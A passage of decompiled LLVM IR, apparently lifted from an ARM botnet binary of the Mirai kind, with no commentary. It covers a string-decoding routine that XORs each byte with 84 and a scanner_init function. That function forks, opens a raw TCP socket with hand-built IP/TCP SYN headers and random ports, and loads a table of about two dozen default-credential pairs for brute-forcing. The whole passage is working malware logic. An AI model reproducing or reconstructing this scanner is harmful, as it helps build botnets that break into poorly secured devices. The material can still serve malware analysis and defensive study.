  %v0_e3c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_e3c4 = load i32, i32* @r8, align 4
  %v5_e3c4 = mul i32 %v2_e34c, 16
  %v6_e3c4 = add i32 %v1_e3c4, %v5_e3c4
  %v7_e3c4 = inttoptr i32 %v6_e3c4 to i32*
  store i32 %v0_e3c4, i32* %v7_e3c4, align 4
  %v2_e3c8 = load i32, i32* @global_var_23278.140, align 4
  store i32 %v2_e3c8, i32* @r7, align 4
  %v1_e3cc = inttoptr i32 %arg2 to i8*
  %v2_e3cc = call i32 @util_strlen(i8* %v1_e3cc)
  %sext1 = mul i32 %v2_e3cc, 16777216
  %v1_e3d0 = sdiv i32 %sext1, 16777216
  %v2_e3d0 = add nsw i32 %v1_e3d0, 1
  store i32 %v2_e3d0, i32* @r4, align 4
  store i32 %v1_e3d0, i32* @r6, align 4
  store i32 %v2_e3d0, i32* @r0, align 4
  %v0_e3dc = call i32 @malloc()
  store i32 %v0_e3dc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e3e4 = load i32, i32* @r4, align 4
  store i32 %v0_e3e4, i32* %r2.global-to-local, align 4
  store i32 %v0_e3dc, i32* %r5.global-to-local, align 4
  %v3_e3ec = call i32 @util_memcpy(i32 %v0_e3dc, i32 %arg2, i32 %v0_e3e4)
  store i32 %v3_e3ec, i32* %r0.global-to-local, align 4
  %v0_e3f0 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e3f0, 1
  %extract.t8 = trunc i32 %v0_e3f0 to i8
  br i1 %tmp23, label %dec_label_pc_e414, label %dec_label_pc_e3f8

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3a8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e3fc

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3fc, %dec_label_pc_e3f8
  %v2_e404 = phi i32 [ %v1_e408, %dec_label_pc_e3fc ], [ 0, %dec_label_pc_e3f8 ]
  %v1_e3fc = load i32, i32* %r5.global-to-local, align 4
  %v2_e3fc = add i32 %v1_e3fc, %v2_e404
  %v3_e3fc = inttoptr i32 %v2_e3fc to i8*
  %v4_e3fc = load i8, i8* %v3_e3fc, align 1
  %v6_e3fc = zext i8 %v4_e3fc to i32
  %v1_e400 = xor i32 %v6_e3fc, 84
  store i32 %v1_e400, i32* %r3.global-to-local, align 4
  %v1_e404 = trunc i32 %v1_e400 to i8
  store i8 %v1_e404, i8* %v3_e3fc, align 1
  %v0_e408 = load i32, i32* %r2.global-to-local, align 4
  %v1_e408 = add i32 %v0_e408, 1
  store i32 %v1_e408, i32* %r2.global-to-local, align 4
  %v1_e40c = load i32, i32* @r6, align 4
  %v9_e40c = icmp eq i32 %v1_e408, %v1_e40c
  br i1 %v9_e40c, label %dec_label_pc_e414.loopexit, label %dec_label_pc_e3fc

dec_label_pc_e414.loopexit:                       ; preds = %dec_label_pc_e3fc
  %extract.t7 = trunc i32 %v1_e408 to i8
  br label %dec_label_pc_e414

dec_label_pc_e414:                                ; preds = %dec_label_pc_e414.loopexit, %dec_label_pc_e3a8
  %v0_e424.off0 = phi i8 [ %extract.t7, %dec_label_pc_e414.loopexit ], [ %extract.t8, %dec_label_pc_e3a8 ]
  %v2_e414 = load i32, i32* @global_var_2324c.138, align 4
  store i32 %v2_e414, i32* %r0.global-to-local, align 4
  %v2_e418 = load i32, i32* @global_var_23278.140, align 4
  %v3_e41c = mul i32 %v2_e414, 16
  store i32 %v3_e41c, i32* %r1.global-to-local, align 4
  %v2_e420 = or i32 %v3_e41c, 13
  %v3_e424 = add i32 %v2_e420, %v2_e418
  %v4_e424 = inttoptr i32 %v3_e424 to i8*
  store i8 %v0_e424.off0, i8* %v4_e424, align 1
  store i32 ptrtoint (i16** @global_var_2327c.142 to i32), i32* %r4.global-to-local, align 4
  %v2_e430 = load i16, i16* bitcast (i16** @global_var_2327c.142 to i16*), align 4
  %v3_e430 = zext i16 %v2_e430 to i32
  store i32 %v3_e430, i32* %lr.global-to-local, align 4
  %v2_e438 = load i32, i32* @global_var_23278.140, align 4
  store i32 %v2_e438, i32* %r2.global-to-local, align 4
  %v0_e440 = load i32, i32* %r1.global-to-local, align 4
  %v2_e440 = add i32 %v0_e440, %v2_e438
  store i32 %v2_e440, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2327c.142 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e448 = load i32, i32* @sb, align 4
  %v1_e448 = load i32, i32* @r7, align 4
  %v2_e448 = add i32 %v1_e448, %v0_e448
  store i32 %v2_e448, i32* %ip.global-to-local, align 4
  %v0_e44c = load i32, i32* %r0.global-to-local, align 4
  %v1_e44c = add i32 %v0_e44c, 1
  store i32 %v1_e44c, i32* %r0.global-to-local, align 4
  %v3_e450 = add i32 %v2_e440, 10
  %v4_e450 = inttoptr i32 %v3_e450 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_2327c.142 to i32), i32 16), i32 16) to i16), i16* %v4_e450, align 2
  %v0_e454 = load i32, i32* %lr.global-to-local, align 4
  %v1_e454 = trunc i32 %v0_e454 to i16
  %v2_e454 = load i32, i32* %r1.global-to-local, align 4
  %v3_e454 = add i32 %v2_e454, 8
  %v4_e454 = inttoptr i32 %v3_e454 to i16*
  store i16 %v1_e454, i16* %v4_e454, align 2
  %v0_e458 = load i32, i32* %r5.global-to-local, align 4
  %v1_e458 = load i32, i32* %ip.global-to-local, align 4
  %v2_e458 = add i32 %v1_e458, 4
  %v3_e458 = inttoptr i32 %v2_e458 to i32*
  store i32 %v0_e458, i32* %v3_e458, align 4
  %v1_e45c = load i32, i32* @fp, align 4
  %v2_e45c = inttoptr i32 %v1_e45c to i32*
  store i32 %v1_e44c, i32* %v2_e45c, align 4
  %v0_e460 = load i32, i32* %r3.global-to-local, align 4
  %v1_e460 = trunc i32 %v0_e460 to i16
  %v2_e460 = load i32, i32* %r4.global-to-local, align 4
  %v3_e460 = inttoptr i32 %v2_e460 to i16*
  store i16 %v1_e460, i16* %v3_e460, align 2
  store i32 %v3_e31c, i32* @r4, align 4
  store i32 %v6_e31c, i32* @r5, align 4
  store i32 %v9_e31c, i32* @r6, align 4
  store i32 %v12_e31c, i32* @r7, align 4
  store i32 %v15_e31c, i32* @r8, align 4
  store i32 %v18_e31c, i32* @sb, align 4
  store i32 %v21_e31c, i32* @sl, align 4
  store i32 %v24_e31c, i32* @fp, align 4
  ret i32 %v1_e44c

; uselistorder directives
  uselistorder i32 %v3_e41c, { 1, 0 }
  uselistorder i32 %v1_e408, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e3dc, { 1, 0, 2 }
  uselistorder i32 %v3_e3b0, { 1, 0 }
  uselistorder i32 %v1_e39c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e370, { 1, 0, 2 }
  uselistorder i32 %v2_e34c, { 1, 0, 2 }
  uselistorder i32 %v3_e340, { 1, 0 }
  uselistorder i32 %v1_e330, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v3_e47c = load i32, i32* @r4, align 4
  %v6_e47c = load i32, i32* @r5, align 4
  %v18_e47c = load i32, i32* @sb, align 4
  %v0_e488 = call i32 @__libc_fork()
  store i32 %v0_e488, i32* %r0.global-to-local, align 4
  %v7_e48c = icmp eq i32 %v0_e488, -1
  %. = zext i1 %v7_e48c to i32
  %tmp1365 = icmp slt i32 %v0_e488, 1
  %storemerge1281 = select i1 %tmp1365, i32 %., i32 1
  store i32 %storemerge1281, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_25d6c.144 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e4a8 = icmp eq i32 %storemerge1281, 0
  store i1 %v2_e4a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e488, i32* @global_var_25d6c.144, align 4
  br i1 %v2_e4a8, label %dec_label_pc_e540, label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %entry
  store i32 %v3_e47c, i32* %r4.global-to-local, align 4
  store i32 %v6_e47c, i32* @r5, align 4
  store i32 %v18_e47c, i32* @sb, align 4
  ret i32 %v0_e488

dec_label_pc_e540:                                ; preds = %entry
  %v0_e540 = call i32 @util_local_addr()
  store i32 %v0_e540, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e540, i32* @global_var_25d48.57, align 4
  %v1_e54c = call i32 @rand_init(i32 %v0_e540)
  %v0_e550 = load i32, i32* @r4, align 4
  store i32 %v0_e550, i32* %r0.global-to-local, align 4
  %v1_e554 = inttoptr i32 %v0_e550 to i32*
  %v2_e554 = call i32 @__GI_time(i32* %v1_e554)
  store i32 ptrtoint (i32* @global_var_23280.136 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e554, i32* @global_var_23280.136, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e568 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_25d64.148 to i32), i32* %r3.global-to-local, align 4
  %v0_e570 = load i32, i32* @r4, align 4
  store i32 %v0_e570, i32* %stack_var_-52, align 4
  store i32 %v2_e568, i32* @global_var_25d64.148, align 4
  store i32 %v0_e570, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e57c

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e57c.dec_label_pc_e57c_crit_edge, %dec_label_pc_e540
  %v2_e588 = phi i32 [ %v2_e588.pre, %dec_label_pc_e57c.dec_label_pc_e57c_crit_edge ], [ %v2_e568, %dec_label_pc_e540 ]
  %v0_e584 = phi i32 [ %v0_e5c0, %dec_label_pc_e57c.dec_label_pc_e57c_crit_edge ], [ %v0_e570, %dec_label_pc_e540 ]
  store i32 ptrtoint (i32* @global_var_25d64.148 to i32), i32* %r4.global-to-local, align 4
  %v3_e584 = mul i32 %v0_e584, 256
  store i32 %v3_e584, i32* %ip.global-to-local, align 4
  store i32 %v2_e588, i32* @lr, align 4
  %v2_e598 = mul i32 %v0_e584, 288
  %v1_e5a0 = add i32 %v0_e584, 1
  store i32 %v1_e5a0, i32* %r0.global-to-local, align 4
  %v2_e5a4 = add i32 %v2_e598, %v2_e588
  store i32 %v2_e5a4, i32* %r2.global-to-local, align 4
  store i32 %v2_e5a4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e5b8 = add i32 %v2_e5a4, 4
  %v3_e5b8 = inttoptr i32 %v2_e5b8 to i32*
  store i32 -1, i32* %v3_e5b8, align 4
  %v0_e5bc = load i32, i32* @r5, align 4
  %v1_e5bc = load i32, i32* %r1.global-to-local, align 4
  %v2_e5bc = add i32 %v1_e5bc, 12
  %v3_e5bc = inttoptr i32 %v2_e5bc to i32*
  store i32 %v0_e5bc, i32* %v3_e5bc, align 4
  %v0_e5c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e5c0, i32* %stack_var_-52, align 4
  %v7_e5c4 = icmp sgt i32 %v1_e5a0, 255
  br i1 %v7_e5c4, label %dec_label_pc_e5c8, label %dec_label_pc_e57c.dec_label_pc_e57c_crit_edge

dec_label_pc_e57c.dec_label_pc_e57c_crit_edge:    ; preds = %dec_label_pc_e57c
  %v2_e588.pre = load i32, i32* @global_var_25d64.148, align 4
  br label %dec_label_pc_e57c

dec_label_pc_e5c8:                                ; preds = %dec_label_pc_e57c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_e5d4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e5d4, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e5e0 = load i32, i32* @r5, align 4
  store i32 %v0_e5e0, i32* @r2, align 4
  store i32 %v3_e5d4, i32* @global_var_25d68.150, align 4
  store i32 %v3_e5d4, i32* @r4, align 4
  %v2_e5ec = call i32 @__libc_fcntl(i32 %v3_e5d4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e5f4 = or i32 %v2_e5ec, 2048
  store i32 %v1_e5f4, i32* @r2, align 4
  %v0_e5f8 = load i32, i32* @r4, align 4
  store i32 %v0_e5f8, i32* %r0.global-to-local, align 4
  %v2_e5fc = call i32 @__libc_fcntl(i32 %v0_e5f8, i32 4)
  %v2_e600 = ptrtoint i8* %stack_var_-56 to i32
  %v2_e604 = load i32, i32* @global_var_25d68.150, align 4
  store i32 %v2_e604, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e60c = load i32, i32* @r5, align 4
  store i32 %v0_e60c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e614 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e614, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e624 = call i32 @__GI_setsockopt(i32 %v2_e604, i32 %v0_e60c, i32 3, i32 %v2_e614, i32 4)
  store i32 %v5_e624, i32* %r0.global-to-local, align 4
  %v1_e628 = load i32, i32* @r5, align 4
  %v3_e628 = icmp uge i32 %v5_e624, %v1_e628
  store i1 %v3_e628, i1* %cpsr_c.global-to-local, align 1
  %v9_e628 = icmp eq i32 %v5_e624, %v1_e628
  store i1 %v9_e628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e628, label %dec_label_pc_e630, label %dec_label_pc_10434

dec_label_pc_e630:                                ; preds = %dec_label_pc_e5c8, %dec_label_pc_10434, %dec_label_pc_e630
  %v0_e630 = call i32 @rand_next()
  %v3_e634 = mul i32 %v0_e630, 65536
  store i32 %v3_e634, i32* %r0.global-to-local, align 4
  %v3_e638 = urem i32 %v0_e630, 65536
  store i32 %v3_e638, i32* %ip.global-to-local, align 4
  %v1_e63c = mul i32 %v0_e630, 256
  %v3_e640 = and i32 %v1_e63c, 65280
  %tmp1368 = udiv i32 %v0_e630, 256
  %v4_e644 = urem i32 %tmp1368, 256
  %v5_e644 = or i32 %v4_e644, %v3_e640
  store i32 %v5_e644, i32* %r3.global-to-local, align 4
  %v2_e648 = icmp ugt i32 %v5_e644, 1023
  store i1 %v2_e648, i1* %cpsr_c.global-to-local, align 1
  %v7_e648 = icmp eq i32 %v5_e644, 1024
  store i1 %v7_e648, i1* %cpsr_z.global-to-local, align 1
  %v3_e650 = icmp ult i32 %v5_e644, 1022
  br i1 %v3_e650, label %dec_label_pc_e630, label %dec_label_pc_e654

dec_label_pc_e654:                                ; preds = %dec_label_pc_e630
  %v5_e64c.le = trunc i32 %v0_e630 to i16
  %v2_e658 = load i8, i8* bitcast (i8** @global_var_23250.152 to i8*), align 4
  %v3_e658 = zext i8 %v2_e658 to i32
  %v1_e65c = and i32 %v3_e658, 240
  %v1_e660 = or i32 %v1_e65c, 5
  store i32 %v1_e660, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r0.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_23250.152 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_23252.153 to i16*), align 4
  %v0_e680 = call i32 @rand_next()
  %v1_e680 = trunc i32 %v0_e680 to i16
  store i32 %v0_e680, i32* %r0.global-to-local, align 4
  %v3_e688 = load i8, i8* @global_var_23270.156, align 1
  store i32 ptrtoint (i32* @global_var_23264.155 to i32), i32* @fp, align 4
  store i32 ptrtoint (i8** @global_var_23250.152 to i32), i32* @r4, align 4
  %tmp = urem i8 %v3_e688, 16
  %v1_e698 = zext i8 %tmp to i32
  store i16 %v1_e680, i16* bitcast (i32* @global_var_23254.157 to i16*), align 4
  %v1_e6a0 = or i32 %v1_e698, 80
  store i32 %v1_e6a0, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_23258.158 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_23259.159 to i8*), align 4
  %v1_e6b4 = trunc i32 %v1_e6a0 to i8
  store i8 %v1_e6b4, i8* @global_var_23270.156, align 1
  %v4_e6b8 = sext i16 %v5_e64c.le to i32
  store i32 %v4_e6b8, i32* @lr, align 4
  store i32 5888, i32* %ip.global-to-local, align 4
  store i16 5888, i16* @global_var_23266.160, align 2
  store i16 %v5_e64c.le, i16* bitcast (i32* @global_var_23264.155 to i16*), align 4
  %v0_e6c8 = call i32 @rand_next()
  %v1_e6c8 = trunc i32 %v0_e6c8 to i16
  %v3_e6cc = load i8, i8* @global_var_23271.161, align 1
  %v4_e6cc = zext i8 %v3_e6cc to i32
  %v1_e6d0 = or i32 %v4_e6cc, 2
  store i32 %v1_e6d0, i32* %r3.global-to-local, align 4
  %v1_e6d4 = trunc i32 %v1_e6d0 to i8
  store i8 %v1_e6d4, i8* @global_var_23271.161, align 1
  store i16 %v1_e6c8, i16* bitcast (i32* @global_var_23272.162 to i16*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a820.164 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r0.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e6e8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a820.164 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a828.168 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e6f8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a828.168 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a830.170 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e708 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a830.170 to i32), i32 11)
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r1.global-to-local, align 4
  %v5_e718 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_e728 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a818.166 to i32), i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32* %r1.global-to-local, align 4
  %v5_e738 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a830.170 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e748 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a838.174 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a830.170 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r1.global-to-local, align 4
  %v5_e758 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 14)
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a848.178 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e768 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 ptrtoint (i32* @global_var_1a848.178 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a854.180 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e778 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 ptrtoint (i32* @global_var_1a854.180 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a860.182 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_e788 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a860.182 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e798 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a840.176 to i32), i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a870.186 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7a8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a870.186 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a878.188 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7b8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a878.188 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a880.190 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7c8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a880.190 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a88c.192 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e7d8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a88c.192 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a894.194 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_e7e8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a894.194 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r1.global-to-local, align 4
  %v5_e7f8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a898.196 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e808 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a898.196 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e818 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a868.184 to i32), i32 ptrtoint (i32* @global_var_1a86c.172 to i32), i32 4)
  store i32 ptrtoint ([8 x i8]* @global_var_1a8a0.198 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a8a0.198 to i32), i32* %r1.global-to-local, align 4
  %v5_e828 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a8a0.198 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a8a0.198 to i32), i32 14)
  store i32 ptrtoint ([7 x i8]* @global_var_1a8a8.200 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a8b0.202 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e838 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1a8a8.200 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a8b0.202 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32* %r1.global-to-local, align 4
  %v5_e848 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a8c0.206 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e858 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a8c0.206 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a8b8.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a8c8.208 to i32), i32* %r1.global-to-local, align 4
